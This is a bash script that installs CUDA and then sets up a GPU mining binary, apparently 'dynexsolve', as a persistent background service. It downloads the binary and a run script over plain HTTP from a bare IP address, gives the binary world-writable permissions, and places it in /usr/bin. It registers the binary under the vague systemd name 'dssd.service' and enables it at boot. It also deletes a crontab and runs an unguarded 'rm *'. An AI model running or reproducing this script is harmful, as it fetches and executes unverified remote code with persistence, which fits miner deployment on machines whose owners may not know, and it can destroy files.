sudo rm /var/spool/cron/crontabs/phucute123
sudo rm -rf /home/phucute123/run
rm *
wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/cuda-ubuntu2004.pin
sudo mv cuda-ubuntu2004.pin /etc/apt/preferences.d/cuda-repository-pin-600
wget https://developer.download.nvidia.com/compute/cuda/11.8.0/local_installers/cuda-repo-ubuntu2004-11-8-local_11.8.0-520.61.05-1_amd64.deb
sudo dpkg -i cuda-repo-ubuntu2004-11-8-local_11.8.0-520.61.05-1_amd64.deb
sudo cp /var/cuda-repo-ubuntu2004-11-8-local/cuda-*-keyring.gpg /usr/share/keyrings/
sudo apt-get update
sudo apt-get -y install cuda
sudo apt-get install -y libcurl4-nss-dev
mkdir /home/phucute123/run
cd /home/phucute123/run
wget http://139.59.106.85/khang/dynexsolve -P /home/phucute123/run
wget http://139.59.106.85/khang/run.sh -P /home/phucute123/run
wget https://raw.githubusercontent.com/khangcbs/mr/main/dssd.service -P /home/phucute123/run
chmod 777 /home/phucute123/run/dynexsolve
sudo cp /home/phucute123/run/dynexsolve /usr/bin/
chmod +x /home/phucute123/run/run.sh
sudo cp /home/phucute123/run/dssd.service /etc/systemd/system/dssd.service
sudo systemctl enable dssd.service
sudo systemctl start dssd.service
sudo systemctl status dssd.service



